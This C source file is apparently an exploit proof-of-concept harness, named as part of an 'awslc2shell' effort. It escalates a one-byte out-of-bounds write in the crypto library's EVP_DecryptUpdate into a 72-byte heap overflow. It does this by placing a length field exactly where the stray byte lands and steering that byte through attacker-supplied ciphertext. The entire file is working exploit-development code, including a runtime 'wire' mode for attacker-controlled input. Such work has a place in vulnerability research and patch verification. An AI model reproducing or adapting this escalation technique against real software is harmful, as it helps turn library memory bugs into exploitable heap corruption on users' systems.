// awslc2shell W212: does the CVE's one-byte OOB write corrupt a length that a
// consumer then uses for a real copy, turning one byte into a larger overflow?
//
// The record is natural C layout: no #pragma pack, no tag, no table, no
// grooming. `data[31]` is the documented-minimum EVP_DecryptUpdate output
// buffer; `len` sits at struct offset 31, exactly where the CVE writes; `body`
// holds enough bytes that the corrupted length cannot over-read the source.
// The consumer copies `len` bytes from `body` into an 8-byte heap allocation
// sized for the *initial* length. On the vulnerable library the CVE byte
// (0x48 = 72) drives a 72-byte heap write; on the fixed library `len` is
// unchanged and the copy is one byte.
//
// Built with ASan in the harness only, against the plain (non-ASan) pinned
// libs, so the library's own one-byte write lands in the real global object
// rather than an ASan redzone. ASan therefore reports the SECOND-order copy,
// not the original OOB.
//
// Usage: frame-datum-vuln vuln|safe|steer|wire | frame-datum-fixed fixed|wire
//        frame-datum-vuln gen [hex-byte]   -> 48-byte ciphertext on stdout
#include <openssl/evp.h>
#include <stddef.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

#define CHOSEN 0x48 /* plaintext byte 31; 72 is larger than the 8-byte dest */
#define INIT_LEN 1
#define DEST_CAP 8

static const uint8_t kKey[16] = {0, 1, 2, 3, 4, 5, 6, 7,
                                 8, 9, 10, 11, 12, 13, 14, 15};
static const uint8_t kIv[16] = {0x80, 0x81, 0x82, 0x83, 0x84, 0x85, 0x86, 0x87,
                                0x88, 0x89, 0x8a, 0x8b, 0x8c, 0x8d, 0x8e, 0x8f};

struct frame {
  uint8_t data[31];
  uint8_t len;
  uint8_t body[128];
};

static struct frame g;

static int make_ciphertext(uint8_t *ct, int *ct_len, uint8_t chosen) {
  uint8_t pt[32];
  for (int i = 0; i < 32; i++) {
    pt[i] = (uint8_t)i;
  }
  pt[31] = chosen;
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n = 0, f = 0, ok = 0;
  if (ctx != NULL &&
      EVP_EncryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, kKey, kIv) &&
      EVP_EncryptUpdate(ctx, ct, &n, pt, 32) &&
      EVP_EncryptFinal_ex(ctx, ct + n, &f) && n + f == 48) {
    *ct_len = n + f;
    ok = 1;
  }
  EVP_CIPHER_CTX_free(ctx);
  return ok;
}

static int hex_byte(const char *s, uint8_t *out) {
  if (strlen(s) != 2) {
    return 0;
  }
  int hi = -1, lo = -1;
  for (int i = 0; i < 2; i++) {
    int v = -1;
    if (s[i] >= '0' && s[i] <= '9') v = s[i] - '0';
    else if (s[i] >= 'a' && s[i] <= 'f') v = s[i] - 'a' + 10;
    else if (s[i] >= 'A' && s[i] <= 'F') v = s[i] - 'A' + 10;
    if (v < 0) {
      return 0;
    }
    if (i == 0) hi = v; else lo = v;
  }
  *out = (uint8_t)((hi << 4) | lo);
  return 1;
}

int main(int argc, char **argv) {
  if (argc < 2) {
    fprintf(stderr, "usage: %s MODE [hex-byte]\n", argv[0]);
    return 2;
  }
  const char *mode = argv[1];

  // gen writes a 48-byte CBC ciphertext for a caller-supplied plaintext byte
  // (default CHOSEN) to stdout. wire reads that ciphertext from stdin, so the
  // steering byte is runtime/attacker-supplied, not a compile-time macro.
  if (strcmp(mode, "gen") == 0) {
    uint8_t c = CHOSEN;
    if (argc == 3 && !hex_byte(argv[2], &c)) {
      return 2;
    }
    uint8_t ct[64];
    int ct_len = 0;
    if (!make_ciphertext(ct, &ct_len, c) ||
        fwrite(ct, 1, (size_t)ct_len, stdout) != (size_t)ct_len) {
      return 2;
    }
    return 0;
  }

  const int is_wire = strcmp(mode, "wire") == 0;
  uint8_t chosen = 0xff; /* wire mode: steering byte arrives in ciphertext */
  uint8_t init_len = INIT_LEN;
  if (!is_wire) {
    if (strcmp(mode, "vuln") == 0 || strcmp(mode, "fixed") == 0) {
      chosen = CHOSEN;
    } else if (strcmp(mode, "steer") == 0) {
      chosen = 0x02;
    } else if (strcmp(mode, "safe") == 0) {
      chosen = 0x00;
      init_len = 0;
    } else {
      fprintf(stderr, "unknown mode %s\n", mode);
      return 2;
    }
  }

  uint8_t ct[64];
  int ct_len = 0;
  if (is_wire) {
    ct_len = (int)fread(ct, 1, sizeof(ct), stdin);
    if (ct_len != 48) {
      fprintf(stderr, "wire mode wants 48 ciphertext bytes, got %d\n", ct_len);
      return 2;
    }
  } else if (!make_ciphertext(ct, &ct_len, chosen)) {
    return 2;
  }

  memset(&g, 0, sizeof(g));
  g.len = init_len;
  for (size_t i = 0; i < sizeof(g.body); i++) {
    g.body[i] = (uint8_t)(i + 1);
  }
  const uint8_t len_before = g.len;

  // Two boundary-crossing updates into the documented-minimum data[31].
  EVP_CIPHER_CTX *ctx = EVP_CIPHER_CTX_new();
  int n = 0;
  int ok = ctx != NULL &&
           EVP_DecryptInit_ex(ctx, EVP_aes_128_cbc(), NULL, kKey, kIv);
  for (int off = 0; ok && off < 32; off += 16) {
    ok = EVP_DecryptUpdate(ctx, g.data, &n, ct + off, 16);
  }
  EVP_CIPHER_CTX_free(ctx);

  const uint8_t len_after = g.len;
  fprintf(stderr,
          "%s: data_off=%zu len_off=%zu body_off=%zu struct_size=%zu "
          "chosen=0x%02x len_before=%u len_after=%u decrypt_ok=%d "
          "dest_cap=%d\n",
          mode, offsetof(struct frame, data), offsetof(struct frame, len),
          offsetof(struct frame, body), sizeof(g), chosen, len_before,
          len_after, ok, DEST_CAP);
  fflush(stderr);

  // Real consumer step: copy the frame body using the frame's own length.
  // dest was sized for len_before, not for the post-decrypt len.
  uint8_t *dest = malloc(DEST_CAP);
  if (dest == NULL) {
    return 2;
  }
  memcpy(dest, g.body, g.len);
  const uint8_t sink = dest[0];
  free(dest);
  return sink == 0 ? 1 : 0;
}
